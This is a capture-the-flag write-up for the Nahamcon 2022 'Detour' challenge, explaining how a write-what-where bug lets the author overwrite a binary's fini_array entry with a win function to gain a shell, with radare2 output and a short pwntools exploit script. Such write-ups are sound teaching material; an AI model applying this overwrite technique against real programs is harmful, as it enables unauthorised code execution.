---
title: "[PWN] Detour [Nahamcon CTF 2022]"
date: 2022-05-06 23:35:00
---

# 0x0 Introduction

Author: @M_alpha#3534

write-what-where as a service! Now how do I detour away from the intended path of execution?

files: [detour](detour)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vuln

This binary give you a chance to write a value to an address. Since stack address is randomized, we can't overwrite rip.

According to this [post](https://stackoverflow.com/questions/26292964/when-will-the-fini-array-section-being-used), when program exit normally, it will call functions in `obj.__fini_array`.

for example, this this binary. the first address in `fini_array` point to `__do_global_dtors_aux`. This function will be called after function return from main.

So, we can write `sym.win` address to `fini_array`. Then, after function return from main, it will call `win` and give us the shell

```
[0x004010f0]> px/a @ obj.__do_global_dtors_aux_fini_array_entry
0x004031c8  0x004011a0 0x00000000 0x00000001 0x00000000  ..@.............
[0x004010f0]> afl~0x004011a0
0x004011a0    3 33   -> 32   sym.__do_global_dtors_aux
```

# 0x3 Exploit

```
exe = context.binary = ELF("detour")
fini_array = exe.symbols["__do_global_dtors_aux_fini_array_entry"]
base = exe.symbols["base"]

io = start()

io.sendlineafter(b"What: ",str(exe.sym["win"]).encode())
io.sendlineafter(b"Where: ",str(fini_array-base).encode())
io.interactive()
```

# 0x2 Flag

None